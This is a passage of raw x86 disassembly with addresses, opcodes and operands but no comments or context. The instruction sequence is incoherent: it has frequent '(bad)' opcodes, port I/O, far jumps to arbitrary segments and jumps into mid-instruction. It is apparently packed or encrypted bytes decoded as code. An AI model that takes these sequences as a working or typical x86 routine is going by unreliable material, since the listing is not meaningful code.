  4055ee:	jo     0x405583
  4055f0:	jo     0x405629
  4055f2:	mov    ebx,ecx
  4055f4:	mov    DWORD PTR [edx+0x66],ecx
  4055f7:	popf   
  4055f8:	stc    
  4055f9:	push   bp
  4055fb:	pushf  
  4055fc:	adc    dl,dl
  4055fe:	lock cdq 
  405600:	mov    cl,0x62
  405602:	and    dl,dl
  405604:	jg     0x405602
  405606:	adc    BYTE PTR [edi],0x53
  405609:	mov    edx,0x15112172
  40560e:	jp     0x4055a4
  405610:	cmp    BYTE PTR [esi],cl
  405612:	sbb    eax,0x6e6042d3
  405617:	aad    0xdd
  405619:	sub    DWORD PTR [edi-0x33],esp
  40561c:	lahf   
  40561d:	jp     0x405682
  40561f:	mov    al,ds:0xc8cfff4a
  405624:	psrld  mm0,QWORD PTR [ecx]
  405627:	push   ecx
  405628:	jp     0x405607
  40562a:	push   0x7345f5c7
  40562f:	jge    0x40561a
  405631:	loope  0x40560e
  405633:	add    DWORD PTR [ebx-0xb68a029],0xbffb89d0
  40563d:	xlat   BYTE PTR ds:[ebx]
  40563e:	mov    bh,0x2
  405640:	lods   al,BYTE PTR ds:[esi]
  405641:	add    ecx,esi
  405643:	imul   edx,ebx,0xfffffffc
  405646:	stos   DWORD PTR es:[edi],eax
  405647:	cmp    eax,0x9afcd38c
  40564c:	lods   eax,DWORD PTR ds:[esi]
  40564d:	lods   eax,DWORD PTR ds:[esi]
  40564e:	push   es
  40564f:	lea    eax,[ebx]
  405651:	add    ebx,0xffffffec
  405654:	out    0xb8,al
  405656:	sbb    edx,ebx
  405658:	xlat   BYTE PTR ds:[ebx]
  405659:	xchg   edi,eax
  40565a:	data16 shl ah,1
  40565d:	scas   eax,DWORD PTR es:[edi]
  40565e:	fs push ss
  405660:	arpl   WORD PTR [ebx],si
  405662:	shl    ebp,1
  405664:	or     ecx,DWORD PTR [edx+0x3777ab07]
  40566a:	adc    DWORD PTR [ebx+0xf11e82a],ebp
  405670:	inc    edx
  405671:	(bad)  
  405672:	mov    eax,ds:0xe9e6ba03
  405677:	and    eax,DWORD PTR [esi+0x19]
  40567a:	shl    BYTE PTR [ebp-0x52],1
  40567d:	pop    esp
  40567e:	dec    ebp
  40567f:	mov    ds:0x8586b00f,eax
  405684:	stos   BYTE PTR es:[edi],al
  405685:	dec    edx
  405686:	pop    ds
  405687:	sbb    BYTE PTR [edi-0x1b],dh
  40568a:	cld    
  40568b:	in     al,dx
  40568c:	jbe    0x4056ec
  40568e:	xchg   esp,eax
  40568f:	xor    ah,BYTE PTR [edx+0x1f]
  405692:	addr16 lock push edx
  405695:	xchg   esi,eax
  405696:	retf   
  405697:	in     eax,0x98
  405699:	sbb    al,0xf0
  40569b:	add    eax,0x42acf987
  4056a0:	jmp    0xa24d:0xee400821
  4056a7:	in     al,0xc9
  4056a9:	shl    BYTE PTR [eax+edx*2+0x73],0x78
  4056ae:	outs   dx,BYTE PTR ds:[esi]
  4056af:	test   DWORD PTR cs:[ebp+0x78],ecx
  4056b3:	adc    dl,al
  4056b5:	mov    edx,ss
  4056b7:	push   esi
  4056b8:	or     al,0xa6
  4056ba:	dec    DWORD PTR [eax+0x7905030d]
  4056c0:	xlat   BYTE PTR ds:[ebx]
  4056c1:	rcr    esi,0xad
  4056c4:	aam    0xe4
  4056c6:	dec    ebp
  4056c7:	jl     0x405658
  4056c9:	in     eax,0x7b
  4056cb:	xchg   ecx,eax
  4056cc:	ret    0x1fc7
  4056cf:	inc    ebp
  4056d0:	cmp    dl,BYTE PTR [edx-0x74]
  4056d3:	retf   
  4056d4:	lahf   
  4056d5:	dec    ebp
  4056d6:	sub    DWORD PTR [ecx+0x20],ebx
  4056d9:	test   eax,0x7ce74a30
  4056de:	xor    ah,BYTE PTR [edi]
  4056e0:	leave  
  4056e1:	pop    ebp
  4056e2:	icebp  
  4056e3:	mov    WORD PTR [ecx+0x58],?
  4056e6:	xor    ecx,eax
  4056e8:	les    edi,FWORD PTR [eax]
  4056ea:	cmp    eax,0x6dfae99
  4056ef:	je     0x4056f1
  4056f1:	bound  edx,QWORD PTR [edx]
  4056f3:	dec    edx
  4056f4:	(bad)  
  4056f5:	stos   BYTE PTR es:[edi],al
  4056f6:	mul    BYTE PTR [edx-0x19]
  4056f9:	mov    cl,0x9f
  4056fb:	pop    eax
  4056fc:	iret   
  4056fd:	lods   al,BYTE PTR ds:[esi]
  4056fe:	int    0x3e
  405700:	jbe    0x405717
  405702:	mov    dh,BYTE PTR [ecx-0x5e]
  405705:	or     esi,DWORD PTR [edi]
  405707:	jno    0x4056df
  405709:	clc    
  40570a:	add    cl,cl
  40570c:	xchg   ecx,eax
  40570d:	int3   
  40570e:	cmp    ch,ah
  405710:	dec    edx
  405711:	rcr    DWORD PTR [ebp+0x59],0x23
  405715:	jbe    0x4056c4
  405717:	cmp    DWORD PTR [edx],edx
  405719:	loope  0x4056c4
  40571b:	icebp  
  40571c:	push   ebp
  40571d:	sub    BYTE PTR [edx+0x7a],cl
  405720:	(bad)  
  405721:	jnp    0x40573a
  405723:	sub    ebx,DWORD PTR [eax-0x5e]
  405726:	arpl   WORD PTR [edi-0x199eff6b],bp
  40572c:	hlt    
  40572d:	ins    BYTE PTR es:[edi],dx
  40572e:	xchg   ecx,eax
  40572f:	inc    eax
  405730:	and    BYTE PTR [edi],ah
  405732:	sti    
  405733:	imul   edx,edi,0x31
  405736:	jg     0x4056c7
  405738:	imul   ebp,DWORD PTR [ebp+0x58],0x67
  40573c:	das    
  40573d:	addr16 loopne 0x405793
  405740:	and    eax,0x64794863
  405745:	mov    esp,0xdd43da21
  40574a:	add    al,cl
  40574c:	gs push ecx
  40574e:	dec    edx
  405750:	lahf   
  405751:	jp     0x4056ec
  405753:	xchg   edi,eax
  405754:	pop    esp
  405755:	mov    DWORD PTR [ecx-0x5c39c883],esp
  40575b:	jmp    0x405761
  40575d:	arpl   WORD PTR ds:0xdb432d9,cx
  405763:	ret    
  405764:	mov    esi,0x451c2890
  405769:	xchg   ecx,eax
  40576a:	retf   0x8ad1
  40576d:	jl     0x40574d
  40576f:	xor    al,0x15
  405771:	mov    ch,0x95
  405773:	test   BYTE PTR [ecx-0x66d0bb01],0x76
  40577a:	mov    esp,0x3d5375ea
  40577f:	or     DWORD PTR [edx],0x73
  405782:	dec    edi
  405783:	addr16 hlt 
  405785:	dec    ecx
  405786:	sub    edx,DWORD PTR [esi]
  405788:	mov    ch,0x2d
  40578a:	xchg   ebp,eax
  40578b:	aas    
  40578c:	adc    BYTE PTR [edx],ch
  40578e:	or     cl,BYTE PTR [ebx+0x3]
  405791:	repz ds cdq 
  405794:	push   ds
  405795:	mov    bh,0x13
  405797:	dec    edi
  405798:	push   esp
  405799:	xchg   ebp,eax
  40579a:	pop    ds
  40579b:	inc    ebp
  40579c:	lea    ebp,[edi+0x94cec19]
  4057a2:	or     al,BYTE PTR [ecx+0x48]
  4057a5:	mov    esp,0x8a6af1ce
  4057aa:	jle    0x40572f
  4057ac:	(bad)  [edi]
  4057ae:	aad    0x4
  4057b0:	add    edx,DWORD PTR [ecx-0x6c4fef49]
  4057b6:	push   eax
  4057b7:	jecxz  0x4057b0
  4057b9:	add    al,0x4f
  4057bb:	or     eax,0x4c3c5749
  4057c0:	mov    esp,0x8fef6288
  4057c5:	mov    WORD PTR [edx+0x25],gs
  4057c8:	retf   0x75ab
  4057cb:	loope  0x405751
  4057cd:	cmp    dl,BYTE PTR [ebx]
  4057cf:	retf   0x23f1
  4057d2:	and    DWORD PTR [edi],ebp
  4057d4:	dec    edx
  4057d5:	rcl    BYTE PTR [ecx+ebx*8],cl
  4057d8:	stos   BYTE PTR es:[edi],al
  4057d9:	in     al,dx
  4057da:	lea    edi,[ecx]
  4057dc:	rcl    BYTE PTR [edx-0x4d],1
  4057df:	popa   
  4057e0:	or     edx,ebx
  4057e2:	clc    
  4057e3:	mov    ch,0xc9
  4057e6:	(bad)  
  4057e7:	sahf   
  4057e8:	aaa    
  4057e9:	aas    
  4057ea:	ss (bad) 
  4057ed:	sbb    al,0xa1
  4057ef:	jae    0x4057a1
  4057f1:	mov    ah,0x16
  4057f3:	push   ebx
  4057f4:	and    eax,0x5ee5de84
  4057f9:	lea    esp,[edx-0x1c22856a]
  4057ff:	or     esi,eax
  405801:	outs   dx,BYTE PTR ds:[esi]
  405802:	and    DWORD PTR [edi+0xa64fd4a],ecx
  405808:	sbb    edi,ebp
  40580a:	test   eax,0x31027635
  40580f:	xor    BYTE PTR [edx-0x4d],al
  405812:	jns    0x40586e
  405814:	into   
  405815:	and    BYTE PTR [ecx-0x23],bl
  405818:	sahf   
  405819:	sti    
  40581a:	aaa    
  40581b:	lock cmp ebx,DWORD PTR [ecx+0x6d]
  40581f:	bound  esp,QWORD PTR [ebp+0x3d]
  405822:	aad    0x16
  405824:	enter  0xc613,0x75
  405828:	xchg   edx,eax
  405829:	xchg   ebx,eax
  40582a:	push   ecx
  40582b:	jne    0x40586c
  40582d:	leave  
  40582e:	mov    al,0x4
  405830:	push   esp
  405831:	test   al,0x52
  405833:	jmp    0x405802
  405835:	ins    BYTE PTR es:[edi],dx
  405836:	call   0x78cd5ba7
  40583b:	jmp    0xb9cb28a5
  405840:	out    0x25,eax
  405842:	dec    ecx
  405843:	in     eax,0x8f
  405845:	in     al,dx
  405846:	adc    al,0x81
  405848:	neg    BYTE PTR [ecx]
  40584a:	cmp    al,0xfe
  40584c:	push   ebp
  40584d:	psubb  mm3,mm2
  405850:	xchg   edx,eax
  405851:	sbb    cl,BYTE PTR [ebx+0x19a1d4f9]
  405857:	push   eax
  405858:	xor    eax,0x94a2da68
  40585d:	jae    0x4058d4
  40585f:	(bad)  
  405860:	push   ecx
  405861:	add    cl,bl
  405863:	in     al,dx
  405864:	dec    edi
  405865:	jnp    0x405853
  405867:	ins    DWORD PTR es:[edi],dx
  405868:	sbb    DWORD PTR [edx+edx*4],edi
  40586b:	pop    eax
  40586c:	jge    0x40585e
  40586e:	add    eax,DWORD PTR [eax]
  405870:	iret   
  405871:	stos   DWORD PTR es:[edi],eax
  405872:	xor    eax,0x8c34567
  405877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405878:	(bad)  
  40587a:	cld    
  40587b:	push   esp
  40587c:	mov    WORD PTR [ebp+0x35],?
  40587f:	scas   eax,DWORD PTR es:[edi]
  405880:	les    ecx,FWORD PTR [esi-0x4a]
  405883:	push   edx
  405884:	push   esi
  405885:	add    DWORD PTR [esi-0x6d1723e8],0xffffff84
  40588c:	in     al,0xf4
  40588e:	loop   0x405833
  405890:	retf   0xdc41
  405893:	and    esi,DWORD PTR [edx+0x58]
  405896:	in     al,dx
  405897:	add    esi,DWORD PTR [ecx-0x22]
  40589a:	adc    al,0x13
  40589c:	test   dl,0x19
  40589f:	ret    0x1558
  4058a2:	(bad)  
  4058a3:	nop
  4058a4:	out    0x4f,al
  4058a6:	lea    ecx,[eax-0x1f]
  4058a9:	sub    esp,DWORD PTR [esi]
  4058ab:	jmp    0x12541816
  4058b0:	jae    0x405882
  4058b2:	test   DWORD PTR [ebx+edi*1-0x39],0x48a4ef59
  4058ba:	inc    ebx
  4058bb:	and    ebx,DWORD PTR [esi-0x4b]
  4058be:	pop    ss
  4058bf:	cmc    
  4058c0:	jne    0x4058a6
  4058c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058c3:	mov    edx,0x91547cd9
  4058c8:	jge    0x40588f
  4058ca:	into   
  4058cb:	int3   
  4058cc:	fnsave [eax]
  4058ce:	rcl    BYTE PTR [edx+0xa],1
  4058d1:	push   ss
  4058d2:	xor    eax,0x5a79de84
  4058d7:	inc    eax
  4058d8:	ins    BYTE PTR es:[edi],dx
  4058d9:	(bad)
  4058de:	cs jecxz 0x40586f
  4058e1:	jae    0x40586d
  4058e3:	pushf  
  4058e4:	std    
  4058e5:	(bad)  
  4058e8:	add    ecx,DWORD PTR [edi]
  4058ea:	rcl    eax,1
  4058ec:	inc    ebp
  4058ed:	shr    bl,cl
  4058ef:	sub    DWORD PTR [ecx],ecx
  4058f1:	sbb    BYTE PTR [esp+edi*2],ah
  4058f4:	push   edi
  4058f5:	push   0xffffff89
  4058f7:	lods   al,BYTE PTR ds:[esi]
  4058f8:	arpl   WORD PTR [esp+eiz*8],dx
  4058fb:	inc    edi
  4058fc:	jb     0x4058fc
  4058fe:	mov    ch,0x9f
  405900:	cmp    DWORD PTR [edx+0x48],ebx
  405903:	xchg   ecx,eax
  405904:	nop
  405905:	or     edx,DWORD PTR cs:[ecx-0x71]
  405909:	add    al,0x64
  40590b:	out    0x5,al
  40590d:	sti    
  40590e:	push   cs
  40590f:	push   ecx
  405910:	adc    BYTE PTR [ebx+0x9],0x8a
  405914:	jecxz  0x4058b2
  405916:	jge    0x405926
  405918:	jmp    0x4058d2
  40591a:	popf   
  40591b:	and    al,0x78
  40591d:	dec    esp
  40591e:	inc    ebp
  40591f:	push   0x11
  405921:	lea    edi,[eax]
  405923:	mov    BYTE PTR ss:[ebx],cl
  405926:	mov    esi,0xc49a8d28
  40592b:	dec    esp
  40592c:	xchg   edi,eax
  40592d:	jmp    0x405999
  40592f:	inc    ebp
  405930:	(bad)  
  405931:	jmp    0x168d:0xca2be2b7
  405938:	popa   
  405939:	sbb    BYTE PTR [ecx],0xbb
  40593c:	and    eax,DWORD PTR [ebp+0x44]
  40593f:	ja     0x4058e9
  405941:	aam    0x74
  405943:	push   DWORD PTR [edx+0x9]
  405946:	fldenv [ecx+0x209535d8]
  40594c:	xchg   BYTE PTR [eax+0x2],al
  40594f:	and    bh,BYTE PTR [ebx]
  405951:	xor    BYTE PTR [edi+0x22181020],ah
  405957:	and    eax,0x7974aa63
  40595c:	jmp    0x61937a51
  405961:	xchg   edi,eax
  405962:	out    dx,al
  405963:	dec    ebx
  405964:	jg     0x405951
  405966:	test   DWORD PTR [esi-0x785fc389],esp
  40596c:	xor    eax,0xa40d2a93
  405971:	mov    cl,0x65
  405973:	sti    
  405974:	imul   edi,DWORD PTR [ecx],0x5b
  405977:	sub    ebp,DWORD PTR [esi+0x6e3befa8]
  40597d:	imul   edi,DWORD PTR [esi],0x9672e066
  405983:	enter  0xb68a,0x51
  405987:	ins    BYTE PTR es:[edi],dx
  405988:	pop    esi
  405989:	and    al,0x89
  40598b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40598c:	mov    ebp,DWORD PTR [eax+0x154ef9eb]
  405992:	call   0x4c57:0x564f7157
  405999:	mov    ecx,0xc2b6c9fa
  40599e:	inc    esi
  40599f:	add    ecx,edi
  4059a1:	inc    ecx
  4059a2:	push   eax
  4059a3:	xchg   edi,eax
  4059a4:	push   0x15ea6e37
  4059a9:	jle    0x405946
  4059ab:	fidiv  WORD PTR [eax]
  4059ad:	sub    cl,BYTE PTR [esi]
  4059af:	out    0x7a,eax
  4059b1:	inc    edi
  4059b2:	xor    BYTE PTR [edx+0x54],0x7e
  4059b6:	pop    ds
  4059b7:	xor    DWORD PTR [ecx],ebx
  4059b9:	add    cl,al
  4059bb:	inc    edx
  4059bc:	mov    ds:0x81716d6b,al
  4059c1:	cmp    ch,dl
  4059c3:	xor    eax,0x6fb97054
  4059c8:	jp     0x40599e
  4059ca:	retf   0xcca5
  4059cd:	imul   ebx,DWORD PTR [eax],0x2e187d6e
  4059d3:	ror    BYTE PTR [edi+0x64],cl
  4059d6:	data16 icebp 
  4059d8:	cmp    al,0xd9
  4059da:	mov    ds:0x5ccff179,al
  4059df:	loop   0x405a02
  4059e1:	rol    dl,1
  4059e3:	inc    ebp
  4059e4:	or     al,0x95
  4059e6:	mov    dh,0xf7
  4059e8:	cdq    
  4059e9:	adc    BYTE PTR [edx],bl
  4059eb:	cmp    ch,BYTE PTR [ebx+0x6e]
  4059ee:	or     esp,DWORD PTR [eax]
  4059f0:	or     eax,0x3ade05f8
  4059f5:	outs   dx,DWORD PTR ds:[esi]
  4059f6:	loopne 0x40598c
  4059f8:	mov    bh,0x8d
  4059fa:	sbb    al,0xb6
  4059fc:	sbb    DWORD PTR [esi],edx
  4059fe:	stos   BYTE PTR es:[edi],al
  4059ff:	popa   
  405a00:	mov    esp,DWORD PTR [ecx-0x3ac94816]
  405a06:	fcomp  QWORD PTR [ebx+0xa78ad14]
  405a0c:	call   0xfb8a:0x733f5eef
  405a13:	dec    eax
  405a14:	fild   QWORD PTR [edi-0x224fdb33]
  405a1a:	fcom   DWORD PTR [esi+eiz*1-0x38ba0c0]
  405a21:	popf   
  405a22:	mov    edx,0x39f4669f
  405a27:	and    BYTE PTR [ecx],dl
  405a29:	adc    edx,DWORD PTR [eax-0x3]
  405a2c:	into   
  405a2d:	lds    edi,FWORD PTR [ecx]
  405a2f:	shl    BYTE PTR [ecx-0x3166533b],0x45
  405a36:	push   0x65
  405a38:	sbb    BYTE PTR [ebx+0x5f],cl
  405a3b:	(bad)  
  405a3d:	mov    edx,0xa834cc88
  405a42:	cmp    al,0x31
  405a44:	out    dx,eax
  405a45:	mov    ecx,0x318d45ee
  405a4a:	dec    ebp
  405a4b:	pop    es
  405a4c:	jle    0x405a13
  405a4e:	hlt    
  405a4f:	dec    esi
  405a50:	and    BYTE PTR [ebx],bh
  405a52:	sub    ch,dl
  405a54:	and    eax,0x3a0fe640
  405a59:	aas    
  405a5a:	or     eax,ebx
  405a5c:	bound  ecx,QWORD PTR [edx]
  405a5e:	das    
  405a5f:	call   0x42b9:0x22fe6d9f
  405a66:	or     ah,BYTE PTR [ebx]
  405a68:	xchg   esp,eax
  405a69:	xchg   edi,eax
  405a6a:	push   ebx
  405a6b:	call   0xf056:0x4f830c25
  405a72:	dec    eax
  405a73:	xchg   BYTE PTR [ecx+0x298c2d42],al
  405a79:	je     0x405a79
  405a7b:	dec    eax
  405a7c:	lahf   
  405a7d:	mov    ah,0xf6
  405a7f:	imul   ebx,DWORD PTR [ebx+0x7c],0xffffffd6
  405a83:	or     BYTE PTR [eax],ch
  405a85:	in     eax,dx
  405a86:	cmp    BYTE PTR [ebx-0x1a728eb3],dl
  405a8c:	add    BYTE PTR [ecx+eax*8-0x239d639e],ah
  405a93:	int    0x90
  405a95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a96:	xchg   esp,eax
  405a97:	jns    0x405a89
  405a99:	mul    DWORD PTR [edx]
  405a9b:	idiv   DWORD PTR [ebx+0x18]
  405a9e:	mov    cl,0x61
  405aa0:	push   es
  405aa1:	mov    bl,0xc9
  405aa3:	in     eax,dx
  405aa4:	test   al,0xe6
  405aa6:	mov    ecx,0xf2bf3320
  405aab:	mov    bl,0x64
  405aad:	sub    BYTE PTR [edi],cl
  405aaf:	jge    0x405adf
  405ab1:	dec    esi
  405ab2:	pop    esi
  405ab3:	lock cmp DWORD PTR [edi+0x5d],0x8
  405ab8:	adc    esp,edx
  405aba:	not    dl
  405abc:	sti    
  405abd:	push   edi
  405abe:	mov    eax,ds:0xf9f862a6
  405ac3:	inc    eax
  405ac4:	dec    edx
  405ac5:	sbb    bh,0x1a
  405ac8:	retf   
  405ac9:	iret   
  405aca:	inc    ebp
  405acb:	cmc    
  405acc:	ret    0xc9f5
  405acf:	cli    
  405ad0:	daa    
  405ad1:	out    0x1d,eax
  405ad3:	add    bl,BYTE PTR [edx+0x79]
  405ad6:	cmp    dl,bh
  405ad8:	xchg   ebp,eax
  405ad9:	dec    esi
  405ada:	cmc    
  405adb:	int3   
  405adc:	mov    dh,0xb9
  405ade:	push   edi
  405adf:	jecxz  0x405a9d
  405ae1:	jmp    0x60cd:0x9238b2b0
  405ae8:	loopne 0x405b1e
  405aea:	lods   eax,DWORD PTR ds:[esi]
  405aeb:	mov    dh,0x83
  405aed:	or     DWORD PTR [edx-0x4fa61709],eax
  405af3:	lods   al,BYTE PTR ds:[esi]
  405af4:	(bad)  
  405af5:	push   ecx
  405af6:	adc    bh,BYTE PTR [ecx+0x257861ff]
  405afc:	sbb    al,0x82
  405afe:	pusha  
  405aff:	pop    edx
  405b00:	stc    
  405b01:	adc    eax,0x88dcbc40
  405b06:	mov    ds:0xb95d7a58,eax
  405b0b:	rcr    BYTE PTR [ebp-0x281bc158],0x36
  405b12:	dec    ebx
  405b13:	int3   
  405b14:	(bad)  
  405b15:	pop    eax
  405b17:	pop    esp
  405b18:	add    BYTE PTR [ecx],dl
  405b1a:	ret    
  405b1b:	loop   0x405af3
  405b1d:	retf   0xc5bd
  405b20:	mov    ebp,0x6d7aa0a1
  405b25:	inc    ebp
  405b26:	ja     0x405b9c
  405b28:	out    0x8b,eax
  405b2a:	fst    QWORD PTR ds:0x77a8132f
  405b30:	(bad)  
  405b31:	outs   dx,DWORD PTR ds:[esi]
  405b32:	das    
  405b33:	sbb    al,0xd3
  405b35:	xor    eax,0x40242e0c
  405b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b3b:	cmc    
  405b3c:	pop    eax
  405b3d:	mov    ch,0xe8
  405b3f:	xor    eax,0xe3681d0d
  405b44:	sub    dh,BYTE PTR [esi+0x78176404]
  405b4a:	cmp    BYTE PTR [edx],bl
  405b4c:	js     0x405b31
  405b4e:	mov    dl,0x2d
  405b50:	and    eax,0x7b770e69
  405b55:	mov    esi,0x9d62c0e0
  405b5a:	outs   dx,DWORD PTR ds:[esi]
  405b5b:	push   edi
  405b5c:	iret   
  405b5d:	pusha  
  405b5e:	std    
  405b5f:	lods   al,BYTE PTR ds:[esi]
  405b60:	stos   DWORD PTR es:[edi],eax
  405b61:	mov    eax,ds:0x7ca5df9e
  405b66:	fmul   QWORD PTR [edx+0x50]
  405b69:	xor    eax,0x38916f3c
  405b6e:	mov    esp,0xec5aa663
  405b73:	icebp  
  405b74:	repnz (bad) 
  405b76:	sbb    eax,0x18574816
  405b7b:	cmp    DWORD PTR [ecx],ecx
  405b7d:	mov    ebp,0xd21f5020
  405b82:	popf   
  405b83:	mov    ds,ecx
  405b85:	or     DWORD PTR [edx-0x67225d75],edi
  405b8b:	mov    BYTE PTR [edx-0x28a4cb72],ah
  405b91:	test   cl,bl
  405b93:	stc    
  405b94:	mov    dl,0xb9
  405b96:	pop    ds
  405b97:	cwde   
  405b98:	test   al,0xaa
  405b9a:	jmp    FWORD PTR [ecx-0x64fe5cdc]
  405ba0:	outs   dx,BYTE PTR ds:[esi]
  405ba1:	inc    esp
  405ba2:	rcr    bh,0x9d
  405ba5:	inc    ebx
  405ba6:	or     al,0x0
  405ba8:	mov    al,0xba
  405baa:	popa   
  405bab:	call   0xefb8:0x2440e717
  405bb2:	(bad)  
  405bb3:	xor    ebp,DWORD PTR [esi+edx*1-0x23]
  405bb7:	xchg   edx,eax
  405bb8:	mov    esi,0x10fb80f9
  405bbd:	loope  0x405c08
  405bbf:	je     0x405bc8
  405bc1:	pop    es
  405bc2:	xchg   BYTE PTR [ecx+0x49a35cca],dl
  405bc8:	repnz inc ebx
  405bca:	loopne 0x405bf1
  405bcc:	pop    ebp
  405bcd:	mov    ch,0x53
  405bcf:	clc    
  405bd0:	(bad)  
  405bd1:	mov    bl,BYTE PTR [eax]
  405bd3:	jl     0x405c15
  405bd5:	mov    ebp,0x95ce7c77
  405bda:	add    cl,cl
  405bdc:	adc    al,0xd0
  405bde:	push   cs
  405bdf:	sti    
  405be0:	hlt    
  405be1:	pop    ss
  405be2:	das    
  405be3:	mov    bl,0x5f
  405be5:	push   cs
  405be6:	out    dx,al
  405be7:	adc    eax,esp
  405be9:	int3   
  405bea:	push   0xf9455255
  405bef:	cmc    
  405bf0:	rcl    BYTE PTR [eax+edx*8],cl
  405bf3:	mov    esp,0x303822fa
  405bf8:	add    cl,BYTE PTR [ebp+esi*4+0x34]
  405bfc:	ds fldln2 
  405bff:	xchg   DWORD PTR [edi-0x7c],eax
  405c02:	cld    
  405c03:	lds    eax,FWORD PTR [edi+0x32]
  405c06:	adc    al,0xbc
  405c08:	es sub al,0xa
  405c0b:	mov    ds:0xd6abee66,al
  405c10:	xchg   DWORD PTR [ecx],ebp
  405c12:	sub    DWORD PTR [edi],edx
  405c14:	nop
  405c15:	rol    DWORD PTR ds:0xe29ba4b2,cl
  405c1b:	shl    BYTE PTR [edi+eiz*1+0x2ca3d538],0x10
  405c23:	jg     0x405c0e
  405c25:	add    DWORD PTR [edi],0x5e
  405c28:	inc    edx
  405c29:	adc    dh,dh
  405c2b:	jns    0x405be1
  405c2d:	and    dl,BYTE PTR [ebx+0x5a35351e]
  405c33:	in     al,dx
  405c34:	imul   esi,DWORD PTR [eax-0x8566f0d],0x358b1cca
  405c3e:	aaa    
  405c3f:	pop    edx
  405c40:	sahf   
  405c41:	cmovp  ecx,DWORD PTR [esp+ecx*4+0x5fda2d21]
  405c49:	push   cs
  405c4a:	call   0x2ec7:0x5b585d2d
  405c51:	imul   esi,DWORD PTR [ebx+ebp*8+0x47],0xffffffe0
  405c56:	or     edi,DWORD PTR [eax+eax*4-0x39]
  405c5a:	sub    bh,ch
  405c5c:	pop    esi
  405c5d:	(bad)  
  405c5e:	pusha  
  405c5f:	jmp    0x405c6d
  405c61:	inc    edx
  405c63:	or     al,0xca
  405c66:	cmp    DWORD PTR [ecx+0x2b883979],ecx
  405c6c:	lods   al,BYTE PTR ds:[esi]
  405c6d:	popf   
  405c6e:	(bad)  
  405c6f:	cmc    
  405c70:	cmp    DWORD PTR [edx],esi
  405c72:	cs std 
  405c74:	sbb    al,0xbb
  405c76:	scas   eax,DWORD PTR es:[edi]
  405c77:	jbe    0x405c64
  405c79:	js     0x405cb6
  405c7b:	sub    dh,BYTE PTR [edx+0x34]
  405c7e:	or     al,0x5
  405c80:	stc    
  405c81:	out    dx,eax
  405c82:	(bad)  
  405c83:	das    
  405c84:	sub    BYTE PTR [edx],bl
  405c86:	or     DWORD PTR [ebx],ebx
  405c88:	fdiv   st(7),st
  405c8a:	outs   dx,BYTE PTR ds:[esi]
  405c8b:	pop    eax
  405c8c:	lahf   
  405c8d:	adc    BYTE PTR [edi-0x439e91db],al
  405c93:	mov    eax,ds:0xb77ac1db
  405c98:	dec    ebp
  405c99:	hlt    
  405c9a:	cwde   
  405c9b:	push   0xa1f41723
  405ca0:	shl    BYTE PTR [ebx-0x6e05c41b],0xe6
  405ca7:	repz or ch,cl
  405caa:	call   0x8d0b:0xfb7c486e
  405cb1:	jns    0x405cf8
  405cb3:	inc    eax
  405cb4:	xchg   ebx,eax
  405cb5:	or     eax,0x1f9343b8
  405cba:	cld    
  405cbb:	inc    BYTE PTR [ecx]
  405cbd:	xchg   DWORD PTR [esi],ebp
  405cbf:	sti    
  405cc0:	or     DWORD PTR [esi-0x3d],edx
  405cc3:	jne    0x405cf3
  405cc5:	mov    ecx,0xd38fde3a
  405cca:	inc    edx
  405ccb:	pop    eax
  405ccc:	mov    ebp,0xba2afd
  405cd1:	mov    ds:0x74a08435,eax
  405cd6:	xchg   ecx,eax
  405cd7:	std    
  405cd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cd9:	leave  
  405cda:	xchg   esi,eax
  405cdb:	dec    ebx
  405cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cdd:	rol    bh,1
  405cdf:	xchg   ebp,eax
  405ce0:	repz addr16 gs or al,0x45
  405ce5:	fidiv  WORD PTR [eax+0x6a57f33b]
  405ceb:	mov    dl,0x1b
  405ced:	push   esi
  405cee:	mov    ds:0xfe9de9b9,eax
  405cf3:	aad    0xe3
  405cf5:	dec    ebp
  405cf6:	cmp    BYTE PTR [esi],cl
  405cf8:	jne    0x405d36
  405cfa:	adc    al,0xb2
  405cfd:	lahf   
  405cfe:	ins    DWORD PTR es:[edi],dx
  405cff:	out    0x14,eax
  405d01:	mov    ds:0x3de56ffd,al
  405d06:	push   ebp
  405d07:	cld    
  405d08:	pop    ss
  405d09:	stos   BYTE PTR es:[edi],al
  405d0a:	pushf  
  405d0b:	push   ecx
  405d0c:	mov    cl,0x14
  405d0e:	shr    DWORD PTR [esi],1
  405d10:	push   0x914e5535
  405d15:	retf   
  405d16:	cli    
  405d17:	add    edi,DWORD PTR [eax]
  405d19:	mov    edx,0x70f26198
  405d1e:	lods   eax,DWORD PTR ds:[esi]
  405d1f:	sbb    al,0x5e
  405d21:	mov    ecx,0x8d79187b
  405d26:	sbb    al,0x71
  405d28:	ja     0x405ce0
  405d2a:	cli    
  405d2b:	mov    edx,0x73b0a209
  405d30:	cli    
  405d31:	mov    eax,ds:0xf3a2236c
  405d36:	or     al,0x62
  405d38:	xchg   ebp,eax
  405d39:	sbb    eax,0x153a38a4
  405d3e:	mov    ds:0xf9e8db0f,eax
  405d43:	xchg   BYTE PTR [ebx+esi*4+0x435ce5f8],bh
  405d4a:	adc    ebx,esi
  405d4c:	add    al,0x4e
  405d4e:	and    al,0x78
  405d50:	lock or DWORD PTR [edx],edx
  405d53:	sbb    DWORD PTR [edx+eiz*1],edx
  405d56:	jecxz  0x405d7c
  405d58:	jge    0x405d28
  405d5a:	jmp    0x405d43
  405d5c:	adc    al,BYTE PTR [edi+0xc501103]
  405d62:	hlt    
  405d63:	dec    ebp
  405d64:	cmp    al,0xcb
  405d66:	std    
  405d67:	mov    ds:0x69546985,al
  405d6c:	ret    
  405d6d:	stos   BYTE PTR es:[edi],al
  405d6e:	(bad)  
  405d6f:	repnz push esi
  405d71:	jo     0x405d9d
  405d73:	and    al,0xa6
  405d75:	jbe    0x405d43
  405d77:	jmp    0x3620:0xcedf2476
  405d7e:	enter  0xfb8b,0x24
  405d82:	(bad)  
  405d83:	in     al,0x9d
  405d85:	dec    eax
  405d86:	int    0xce
  405d88:	jo     0x405dba
  405d8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d8b:	inc    ecx
  405d8c:	mov    dh,0xfb
